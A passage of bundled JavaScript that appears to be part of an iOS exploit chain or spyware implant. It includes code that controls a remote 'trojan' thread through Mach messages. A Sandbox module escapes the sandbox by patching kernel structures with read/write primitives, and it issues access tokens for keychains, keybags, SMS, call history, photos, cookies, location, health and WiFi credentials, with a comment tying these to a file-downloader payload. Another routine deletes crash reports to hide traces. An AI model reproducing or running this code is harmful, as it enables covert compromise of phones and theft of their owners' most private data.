		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, buff);
		return this.write(dst, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
	}

	mem()
	{
		return this.#trojanMem;
	}

	pac(address,modifier)
	{
		return _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(this.#trojanThreadAddr, address, modifier);
	}

	insertRight(port, right)
	{
		//console.log(TAG, "Insert right: " + Utils.hex(port));

		const MACH_MSG_TYPE_COPY_SEND = 19;

		let msgBuff = new ArrayBuffer(24);
		let msg = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__["default"](msgBuff);
		msg.msgh_id = 0x4141;
		msg.msgh_remote_port = this.#localPort;
		msg.msgh_local_port = port;
		msg.msgh_size = 24;
		msg.msgh_bits = _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__["default"].MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, right);

		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, msgBuff);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_msg_send", libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem);
		if (ret != 0) {
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_error_string", ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].readString(errString);
			console.log(TAG, "insertRight: error while sending message: " + errString);
			return 0;
		}
		
		//TODO receive in remote task
		msg.msgh_size = 0x100;
		msg.msgh_local_port = this.#remotePort;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, msgBuff);
		this.write(this.#trojanMem, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, 24);

		ret = this.#doRemoteCallStable(100, "mach_msg_receive", this.#trojanMem);
		if (ret != 0) {
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_error_string", ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].readString(errString);
			console.log(TAG, "insertRight: error while receiving message: " + errString);
			return 0;
		}

		this.read(this.#trojanMem, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n, 24);
		let recvBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n, 24);
		let recvMsg = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__["default"](recvBuff);
		//console.log(TAG, "Recv msg id: " + Utils.hex(recvMsg.msgh_id));
		//console.log(TAG, "Recv remote port: " + Utils.hex(recvMsg.msgh_remote_port));

		ret = this.#doRemoteCallStable(100, "fileport_makefd", recvMsg.msgh_remote_port);
		if (ret < 0) {
			console.log(TAG, "insertRight: error with fileport_makefd");
			return 0;
		}
		//console.log(TAG, "Remote fileport_makefd: " + ret);

		return ret;
	}

	#putShmemInCache(shmem)
	{
		for (let i=0; i<SHMEM_CACHE_SIZE; i++)
		{
			if (!this.#shmemCache[i])
			{
				// TODO encapsulate this inside shmem struct
				let shmemBuff = new ArrayBuffer(0x18);
				this.#shmemCache[i] = new _VMShmem__WEBPACK_IMPORTED_MODULE_10__["default"](shmemBuff);
				this.#shmemCache[i].port = shmem.port;
				this.#shmemCache[i].localAddress = shmem.localAddress;
				this.#shmemCache[i].remoteAddress = shmem.remoteAddress;
				return this.#shmemCache[i];
			}
		}
		return null;
	}

	#getShmemForPage(pageAddr)
	{
		let remotePage = this.#getShmemFromCache(pageAddr);
		if (!remotePage)
		{
			//console.log(TAG, `Page not found in cache: ${Utils.hex(pageAddr)}`);
			let newRemotePage = _VM__WEBPACK_IMPORTED_MODULE_9__["default"].mapRemotePage(this.#vmMap, pageAddr);
			if (!newRemotePage || !newRemotePage.localAddress)
				return false;
			return this.#putShmemInCache(newRemotePage);
		}
		//console.log(TAG, `Page found in cache: ${Utils.hex(pageAddr)}`);
		return remotePage;
	}

	#getShmemFromCache(pageAddr)
	{
		//console.log(TAG,`getShmemFromCache(): pageAddr=${Utils.hex(pageAddr)}`);
		for (let i=0; i<SHMEM_CACHE_SIZE; i++)
		{
			if(this.#shmemCache[i])
				if (this.#shmemCache[i].remoteAddress === pageAddr)
					return this.#shmemCache[i];
		}
		return null;
	}
	#writeCFStr(dst, str) {
		const kCFStringEncodingUTF8 = 0x08000100n;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].writeString(dst, str);
		return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("CFStringCreateWithCString", 0n, dst, kCFStringEncodingUTF8);
	}

	#EXC_GUARD_ENCODE_TYPE(code, type)
	{
		code |= ((type & BigInt('0x7')) << 61n);
		return code;
	}

	#EXC_GUARD_ENCODE_FLAVOR(code, flavor)
	{
		code |= ((flavor & BigInt('0x1fffffff')) << 32n);
		return code;
	}
	
	#EXC_GUARD_ENCODE_TARGET(code, target)
	{
		code |= target & BigInt('0xffffffff');
		return code;
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/Sandbox.js":
/*!*************************************!*\
  !*** ./src/libs/TaskRop/Sandbox.js ***!
  \*************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Sandbox)
/* harmony export */ });
/* harmony import */ var libs_JSUtils_FileUtils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/FileUtils */ "./src/libs/JSUtils/FileUtils.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var _RemoteCall__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./RemoteCall */ "./src/libs/TaskRop/RemoteCall.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");







const TAG = "SANDBOX";

class Sandbox {

	static #launchdTask = null;
	static #PathDictionary = {
		// Communications
		"/private/var/mobile/Library/AddressBook/":0,
		"/private/var/mobile/Library/CallHistoryDB/":0,
		"/private/var/mobile/Library/DoNotDisturb/":0,
		"/private/var/mobile/Library/SMS/":0,
		"/private/var/mobile/Library/Calendar/":0,
		"/private/var/mobile/Library/Mail/":0,
		"/private/var/mobile/Library/Voicemail/":0,
		"/var/mobile/Library/Recordings":0,
		
		// Location
		"/private/var/root/Library/Caches/locationd":0,
		"/private/var/root/Library/Caches/locationd/":0,
		"/private/var/mobile/Library/Caches/locationd/":0,
		"/private/var/mobile/Library/Caches/com.apple.routined/":0,
		
		// Browser & Cookies
		"/private/var/mobile/Library/Safari/":0,
		"/private/var/mobile/Library/Cookies/":0,
		"/private/var/mobile/Cookies/":0,
		
		// Credentials & WiFi
		"/private/var/Keychains/":0,
		"/var/Keychains/":0,
		"/private/var/keybags/":0,
		"/var/keybags/":0,
		"/private/var/keybags/systembag.kb":0,
		"/private/var/keybags/persona.kb":0,
		"/private/var/keybags/usersession.kb":0,
		"/private/var/keybags/backup/":0,
		"/var/keybags/":0,
		"/var/keybags/systembag.kb":0,
		"/var/keybags/persona.kb":0,
		"/var/keybags/usersession.kb":0,
		"/var/keybags/backup/":0,
		"/var/keybags/backup/backup_keys_cache.sqlite":0,
		"/private/var/preferences/com.apple.wifi.known-networks.plist":0,
		"/private/var/preferences/SystemConfiguration/":0,
		"/private/var/preferences/SystemConfiguration/preferences.plist":0,
		"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist":0,
		"/private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist":0,
		"/private/var/networkd/db/":0,
		"/var/wireless/":0,
		"/private/var/wireless/":0,
		"/var/wireless/Library/":0,
		"/var/wireless/Library/Caches/":0,
		"/var/wireless/Library/Preferences/":0,
		"/var/wireless/Library/Databases/":0,
		"/var/wireless/Library/ControlCenter/":0,
		"/private/var/wireless/Library/":0,
		"/private/var/wireless/Library/Preferences/":0,
		"/private/var/wireless/Library/Databases/":0,
		"/private/var/wireless/Library/ControlCenter/":0,
		"/private/var/mobile/Library/CoreDuet/":0,
		"/private/var/mobile/Library/CoreDuet/People/":0,
		"/private/var/mobile/Library/PersonalizationPortrait/":0,
		"/var/log/":0,
		"/private/var/log/":0,
		"/var/db/":0,
		"/private/var/db/":0,
		"/var/run/":0,
		"/private/var/run/":0,
		
		// Personal Data
		"/private/var/mobile/Library/Notes/":0,
		"/private/var/mobile/Library/Health/":0,
		"/private/var/mobile/Media/":0,
		"/private/var/mobile/Media/PhotoData/":0,
		"/private/var/mobile/Media/DCIM/":0,
		"/var/mobile/Media/":0,
		"/var/mobile/Media/PhotoData/":0,
		"/var/mobile/Media/DCIM/":0,
		
		// Device Info
		"/private/var/root/Library/Lockdown/":0,
		"/private/var/mobile/Library/Preferences/":0,
		"/private/var/mobile/Library/Preferences/com.apple.commcenter.shared.plist":0,
		"/private/var/mobile/Library/Preferences/com.apple.identityservices.idstatuscache.plist":0,
		
		// Accounts
		"/private/var/mobile/Library/Accounts/":0,
		
		// Protected & Trust
		"/private/var/protected/trustd/private/":0,
		"/private/var/protected/trustd/private":0,
		
		// System & Apps
		"/bin/":0,
		"/Applications/":0,
		"/private/var/containers/Bundle/Application/":0,
		"/var/containers/Bundle/Application/":0,
		"/private/var/containers/Shared/SystemGroup/":0,
		"/private/var/mobile/Containers/Data/Application/":0,
		"/var/mobile/Containers/Data/Application/":0,
		"/private/var/mobile/Containers/Shared/AppGroup/":0,
		
		// Notifications & Logs
		"/private/var/mobile/Library/UserNotificationsUI/NotificationListPersistentState.json":0,
		"/private/var/mobile/Library/UserNotifications/":0,
		"/private/var/mobile/Library/Logs/CrashReporter/":0,
		"/private/var/mobile/Library/ExternalAccessory":0,
		"/private/var/mobile/Library/Shortcuts/":0,
		
		// Temp directory for file operations
		"/private/var/tmp/":0,
		"/tmp/":0
		/* not allowed via launchd
		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db":0,
		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db-wal":0,
		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db-shm":0
		*/
	};

	static initWithLaunchdTask(launchdTask) {
		this.#launchdTask = launchdTask;
	}

	static getTokenForPath(path, consume=false)
	{

		if (!this.#launchdTask || !this.#launchdTask.success())
			return;

		//console.log(TAG,`Creating token for path:${path}`);
		let memRemote = this.#launchdTask.mem();
		let pathRemote = memRemote;
		this.#launchdTask.writeStr(pathRemote,path);
		let appSandboxReadExt = "com.apple.app-sandbox.read-write";
		let sandboxExtensionEntry = memRemote + 0x100n;
		this.#launchdTask.writeStr(sandboxExtensionEntry,appSandboxReadExt);
		let tokenRemote = this.#launchdTask.call(100, "sandbox_extension_issue_file",sandboxExtensionEntry,pathRemote,0n,0n);
		if (!tokenRemote) {
			console.log(TAG, "Unable to create token for: " + path);
			return null;
		}
		//console.log(TAG,`token:${Utils.hex(tokenRemote)}`);
		let token = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].mem;
		this.#launchdTask.read(tokenRemote,token,512n);
		if(consume)
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_consume",token);
		token = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].readString(token,512);
		//console.log(TAG,`token:${token}`);
		if(!token || !token.includes("com.apple.app-sandbox.read-write"))
		{
			console.log(TAG,`Found weird token:${token}, not registering`);
			return null;
		}
		return token;
	}

	static createTokens()
	{
		console.log(TAG, "Create tokens...");
		let keys = Object.keys(this.#PathDictionary);
		for(let key of keys)
			this.#PathDictionary[key] = this.getTokenForPath(key,false);

		// Those are required for Bailer
		//if (!this.#weAreLaunchd) {
			this.getTokenForPath("/", true);  // Root access for Filza
			this.getTokenForPath("/bin/", true);
			this.getTokenForPath("/Applications/", true);
			this.getTokenForPath("/private/var/tmp/", true);
			this.getTokenForPath("/tmp/", true);
			this.getTokenForPath("/private/var/mobile/Media/", true);
			this.getTokenForPath("/private/var/mobile/Containers/Data/Application/", true);
			this.getTokenForPath("/var/mobile/Containers/Data/Application/", true);
			this.getTokenForPath("/private/var/mobile/Containers/Shared/AppGroup/", true);
			this.getTokenForPath("/private/var/containers/Bundle/Application/", true);
			this.getTokenForPath("/var/containers/Bundle/Application/", true);
			this.getTokenForPath("/private/var/containers/Shared/SystemGroup/", true);
			this.getTokenForPath("/private/var/preferences/SystemConfiguration/preferences.plist", true);
			this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3", true);
			this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3-wal", true);
			this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3-shm", true);
		//}
		
		// Forensic file paths for file_downloader payload
		console.log(TAG, "Create tokens for forensic paths...");
		this.getTokenForPath("/private/var/mobile/Library/SMS/", true);
		this.getTokenForPath("/private/var/mobile/Library/CallHistoryDB/", true);
		this.getTokenForPath("/private/var/mobile/Library/AddressBook/", true);
		this.getTokenForPath("/private/var/mobile/Library/Voicemail/", true);
		
		// Keychain tokens (with /private prefix)
		this.getTokenForPath("/private/var/Keychains/", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db-shm", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db-wal", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db-journal", true);
		
		// Keychain tokens (without /private prefix - alternate)
		this.getTokenForPath("/var/Keychains/", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db-shm", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db-wal", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db-journal", true);
		
		// Keybag tokens (legacy location)
		this.getTokenForPath("/private/var/keybags/", true);
		this.getTokenForPath("/private/var/keybags/systembag.kb", true);
		this.getTokenForPath("/private/var/keybags/persona.kb", true);
		this.getTokenForPath("/private/var/keybags/usersession.kb", true);
		this.getTokenForPath("/private/var/keybags/backup/", true);
		
		// Keybag tokens (without /private - alternate)
		this.getTokenForPath("/var/keybags/", true);
		this.getTokenForPath("/var/keybags/systembag.kb", true);
		this.getTokenForPath("/var/keybags/persona.kb", true);
		this.getTokenForPath("/var/keybags/usersession.kb", true);
		this.getTokenForPath("/var/keybags/backup/", true);
		this.getTokenForPath("/var/keybags/backup/backup_keys_cache.sqlite", true);
		
		// Keybag tokens (Keychains directory - iOS 18)
		this.getTokenForPath("/private/var/Keychains/System.keybag", true);
		this.getTokenForPath("/private/var/Keychains/Backup.keybag", true);
		this.getTokenForPath("/private/var/Keychains/persona.kb", true);
		this.getTokenForPath("/private/var/Keychains/usersession.kb", true);
		this.getTokenForPath("/private/var/Keychains/device.kb", true);
		this.getTokenForPath("/var/Keychains/persona.kb", true);
		
		this.getTokenForPath("/private/var/preferences/SystemConfiguration/com.apple.wifi.plist", true);
		this.getTokenForPath("/private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist", true);
		this.getTokenForPath("/private/var/preferences/com.apple.wifi.known-networks.plist", true);

		// MobileGestalt cache
		this.getTokenForPath("/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/", true);
		this.getTokenForPath("/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist", true);
		
		// WiFi password file locations (for pickup from wifid)
		this.getTokenForPath("/var/wireless/", true);
		this.getTokenForPath("/private/var/wireless/", true);
		this.getTokenForPath("/private/var/wireless/Library/", true);
		this.getTokenForPath("/private/var/wireless/Library/Preferences/", true);
		this.getTokenForPath("/private/var/wireless/Library/Databases/", true);
		this.getTokenForPath("/private/var/wireless/Library/ControlCenter/", true);
		this.getTokenForPath("/private/var/mobile/Library/CoreDuet/", true);
		this.getTokenForPath("/private/var/mobile/Library/PersonalizationPortrait/", true);
		this.getTokenForPath("/var/log/", true);
		this.getTokenForPath("/private/var/log/", true);
		this.getTokenForPath("/var/db/", true);
		this.getTokenForPath("/private/var/db/", true);
		this.getTokenForPath("/var/run/", true);
		this.getTokenForPath("/private/var/run/", true);
		this.getTokenForPath("/private/var/networkd/", true);
		
		this.getTokenForPath("/private/var/mobile/Library/Safari/", true);
		this.getTokenForPath("/private/var/mobile/Library/Cookies/", true);
		this.getTokenForPath("/private/var/mobile/Library/Caches/locationd/", true);
		this.getTokenForPath("/private/var/root/Library/Caches/locationd/", true);
		this.getTokenForPath("/private/var/mobile/Library/Notes/", true);
		this.getTokenForPath("/private/var/mobile/Library/Calendar/", true);
		this.getTokenForPath("/private/var/mobile/Media/PhotoData/", true);
		this.getTokenForPath("/private/var/mobile/Media/DCIM/", true);
		this.getTokenForPath("/var/mobile/Media/", true);
		
		// iCloud Drive tokens
		this.getTokenForPath("/private/var/mobile/Library/Mobile Documents/", true);
		this.getTokenForPath("/private/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/", true);
		this.getTokenForPath("/var/mobile/Media/PhotoData/", true);
		this.getTokenForPath("/var/mobile/Media/DCIM/", true);
		this.getTokenForPath("/private/var/mobile/Library/Health/", true);
		this.getTokenForPath("/private/var/root/Library/Lockdown/", true);
		this.getTokenForPath("/private/var/mobile/Library/Preferences/", true);
		this.getTokenForPath("/private/var/mobile/Library/Accounts/", true);
		this.getTokenForPath("/private/var/mobile/Library/Mail/", true);
		this.getTokenForPath("/private/var/mobile/Library/FrontBoard/", true);
	}

	static applyTokensForRemoteTask(remoteTask)
	{
		let remoteMem = remoteTask.mem();
		let keys = Object.keys(this.#PathDictionary);
		for(let key of keys)
		{
			if(this.#PathDictionary[key])
			{
				//console.log(TAG,`Applying:${this.#PathDictionary[key]}`);
				remoteTask.writeStr(remoteMem,this.#PathDictionary[key]);
				remoteTask.call(100,"sandbox_extension_consume",remoteMem);
				//console.log(TAG,`Result of consume:${resConsume}`);
			}
		}
	}

	static destroy()
	{
		if(this.#launchdTask) {
			LOG("[PE] Cleaning up launchdTask..."); this.#launchdTask.destroy(); LOG("[PE] start() completed successfully");
		}
	}

	static deleteCrashReports()
	{
		this.getTokenForPath("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);
		libs_JSUtils_FileUtils__WEBPACK_IMPORTED_MODULE_0__["default"].deleteDir("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);
	}

	static adjustMemoryPressure(processName) {
		const MEMORYSTATUS_CMD_SET_JETSAM_HIGH_WATER_MARK = 5;
		const MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT = 6;
		const MEMORYSTATUS_CMD_SET_PROCESS_IS_MANAGED = 16;

		let pid = _Task__WEBPACK_IMPORTED_MODULE_2__["default"].pidof(processName);
		if (!pid) {
			console.log(TAG, "Unable to get pid of: " + processName);
			return;
		}

		if (!this.#launchdTask || !this.#launchdTask.success())
			return;

		let memResult = this.#launchdTask.call(100, "memorystatus_control",MEMORYSTATUS_CMD_SET_JETSAM_HIGH_WATER_MARK,pid,-1,0,0);
		console.log(TAG,`waterMark result: ${memResult}`);
		memResult = this.#launchdTask.call(100, "memorystatus_control",MEMORYSTATUS_CMD_SET_PROCESS_IS_MANAGED,pid,0,0,0);
		console.log(TAG,`isManaged result: ${memResult}`);
		memResult = this.#launchdTask.call(100, "memorystatus_control",MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT,pid,0,0,0);
		console.log(TAG,`taskLimit result: ${memResult}`);
	}
	static applySandboxEscape() {
		let _CS_DARWIN_USER_TEMP_DIR = 65537n;
		let write_file_path = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("calloc", 1n, 1024n);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("confstr", _CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024n);
		let randomHex = "/" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("arc4random"));
		let randomHexPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].writeString(randomHexPtr, randomHex);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("strcat", write_file_path, randomHexPtr);

		// mktmp should work
		// confstrr path
		// also in pe
		//let procPath = "/private/var/tmp/com.apple.mediaplaybackd/Library/HTTPStorages/com.apple.mediaplaybackd/"
		let appSandboxReadExt = "com.apple.app-sandbox.read-write";
		let extension = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_issue_file",appSandboxReadExt,write_file_path,0n,0n);
		if (!extension) {
			console.log(TAG,`Sandbox failure 1`);
			return false;
		}
		let resConsume = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_consume",extension);
		if (resConsume == -1) {
			console.log(TAG,`Sandbox failure 2`);
			return false;
		}
		let ourTaskAddr = _Task__WEBPACK_IMPORTED_MODULE_2__["default"].getTaskAddrByPID(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("getpid"));
		console.log(TAG,`ourTaskAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(ourTaskAddr)}`);
		let ourProcAddr = _Task__WEBPACK_IMPORTED_MODULE_2__["default"].getTaskProc(ourTaskAddr);
		console.log(TAG,`ourProcAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(ourProcAddr)}`);
		let credRefAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ourProcAddr + 0x18n);
		if (credRefAddr == 0n) {
			console.log(TAG,`Sandbox failure 3`);
			return false;
		}
		credRefAddr = credRefAddr + 0x28n;
		let credAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(credRefAddr);
		if (credAddr == 0n) {
			console.log(TAG,`Sandbox failure 4`);
			return false;
		}
		console.log(TAG,`credRefAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(credRefAddr)}`);
		let labelAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(credAddr + 0x78n);
		if (labelAddr == 0n) {
			console.log(TAG,`Sandbox failure 5`);
			return false;
		}
		console.log(TAG,`labelAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(labelAddr)}`);
		let sandboxAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(labelAddr + 0x8n + 1n * BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].UINT64_SIZE));
		if (sandboxAddr == 0n) {
			console.log(TAG,`Sandbox failure 6`);
			return false;
		}
		console.log(TAG,`sandboxAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(sandboxAddr)}`);
		let ext_setAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(sandboxAddr + 0x10n);
		if (ext_setAddr == 0n) {
			console.log(TAG,`Sandbox failure 7`);
			return false;
		}
		console.log(TAG,`ext_setAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(ext_setAddr)}`);
		let ext_tableAddr = ext_setAddr + 0x0n; // koffsetof(extension_set, ext_table) = 0x0
		let hash = 0n;
		console.log(TAG,`hash:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(hash)}`);
		//hash = 4n; // for read
		hash = 0n; // for read-write
		let ext_hdrAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_tableAddr + hash * BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].UINT64_SIZE));
		if (ext_hdrAddr == 0n) {
			console.log(TAG,`Sandbox failure 8`);
			return false;
		}
		/*
		newHash = hashing_magic(appSandboxReadWriteExt);
		LOG("ext_hdrAddr:%llx",ext_hdrAddr);
		sleep(1);
		mach_vm_address_t nullAddr = 0;
		chain_write(ext_tableAddr + hash * sizeof(mach_vm_address_t),&nullAddr,sizeof(nullAddr));
		chain_write(ext_tableAddr + newHash * sizeof(mach_vm_address_t),&ext_hdrAddr,sizeof(ext_hdrAddr));
		*/
		for (;;) {
			let nextAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_hdrAddr);
			if(nextAddr == 0n)
				break;
			ext_hdrAddr = nextAddr;
		}
		let ext_lstAddr = ext_hdrAddr + 0x8n; // koffsetof(extension_hdr, ext_lst) == 0x8
		let extAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_lstAddr);
		if (extAddr == 0n) {
			console.log(TAG,`Sandbox failure 9`);
			return false;
		}
		console.log(TAG,`extAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(extAddr)}`);
		let dataLength = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(extAddr + 0x48n);
		let dataAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(extAddr + 0x40n);
		if(dataLength == 0n || dataAddr == 0n) {
			console.log(TAG,`Sandbox failure 10`);
			return false;
		}
		let pathLength = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("strlen",write_file_path) + 1;
		console.log(TAG,`dataLength:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(dataLength)} pathLength:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(pathLength)}`);

		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].write8(dataAddr, 0);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].write64(extAddr + 0x48n,0n);

		console.log(TAG, `Finished succesfully`);

		return true;
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/SelfTaskStruct.js":
/*!********************************************!*\
  !*** ./src/libs/TaskRop/SelfTaskStruct.js ***!
  \********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ SelfTaskStruct)
/* harmony export */ });
class SelfTaskStruct 
{
	#buffer;
	#dataView;
	constructor()
	{
		this.#buffer = new ArrayBuffer(32);
		this.#dataView = new DataView(this.#buffer);
		this.addr = 0x0n;
		this.spaceTable = 0x0n;
		this.portObject = 0x0n;
		this.launchdTask = 0x0n;
	}
	get addr()
	{
		return this.#dataView.getBigUint64(0,true);
	}
	set addr(value)
	{
		this.#dataView.setBigUint64(0,value,true);
	}
	get spaceTable()
	{
		return this.#dataView.getBigUint64(8,true);
	}
	set spaceTable(value)
	{
		this.#dataView.setBigUint64(8,value,true);
	}
	get portObject()
	{
		return this.#dataView.getBigUint64(16,true);
	}
	set portObject(value)
	{
		this.#dataView.setBigUint64(16,value,true);
	}
	get launchdTask()
	{
		return this.#dataView.getBigUint64(24,true);
	}
	set launchdTask(value)
	{
		this.#dataView.setBigUint64(24,value,true);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/Task.js":
/*!**********************************!*\
  !*** ./src/libs/TaskRop/Task.js ***!
  \**********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Task)
/* harmony export */ });
/* harmony import */ var _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./SelfTaskStruct */ "./src/libs/TaskRop/SelfTaskStruct.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");





const TAG = "TASK"
const TASK_EXC_GUARD_MP_CORPSE = 0x40;
const TASK_EXC_GUARD_MP_FATAL = 0x80;
const TASK_EXC_GUARD_MP_DELIVER = 0x10;

class Task
{
	static gSelfTask;
